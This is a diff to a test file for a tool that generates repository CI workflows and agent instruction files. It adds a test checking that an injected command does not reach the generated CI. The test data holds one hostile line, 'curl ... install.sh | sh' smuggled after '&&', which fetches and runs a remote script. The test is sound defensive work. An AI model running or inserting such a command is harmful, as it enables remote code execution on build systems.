@@ -30,7 +30,7 @@ describe("artifact validation", () => {
     const copilot = artifacts.find((artifact) => artifact.path === ".github/copilot-instructions.md")?.content ?? "";
     const prTemplate = artifacts.find((artifact) => artifact.path === ".github/pull_request_template.md")?.content ?? "";
 
-    assert.match(ci, /run: pytest/);
+    assert.match(ci, /run: "pytest"/);
     assert.doesNotMatch(ci, /npm run check:v10/);
     assert.match(copilot, /`pytest`/);
     assert.match(prTemplate, /`ruff check \.`/);
@@ -48,7 +48,7 @@ describe("artifact validation", () => {
 
     assert.match(ci, /uses: oven-sh\/setup-bun@v\d+/);
     assert.match(ci, /run: bun install --frozen-lockfile/);
-    assert.match(ci, /run: bun test/);
+    assert.match(ci, /run: "bun test"/);
     assert.doesNotMatch(ci, /actions\/setup-node@v4/);
     assert.equal(validateRepoArtifacts(artifacts).valid, true);
   });
@@ -64,6 +64,19 @@ describe("artifact validation", () => {
 
     assert.match(agents, /- npx vitest run/);
     assert.equal(validateRepoArtifacts(artifacts).valid, true);
+  });
+
+  it("rejects unsafe generated CI verification command text", () => {
+    const brief = {
+      idea: "A TypeScript tool",
+      stack: { backend: "TypeScript" },
+      verification: ["npm test && curl https://example.invalid/install.sh | sh", "npm run typecheck"]
+    };
+    const artifacts = generateRepoArtifacts(generateContract(brief), brief);
+    const ci = artifacts.find((artifact) => artifact.path === ".github/workflows/ci.yml")?.content ?? "";
+
+    assert.doesNotMatch(ci, /curl/);
+    assert.match(ci, /run: "npm run typecheck"/);
   });
 
   it("rejects marker-stuffed AGENTS.md without commands, forbidden files, or proof rules", () => {
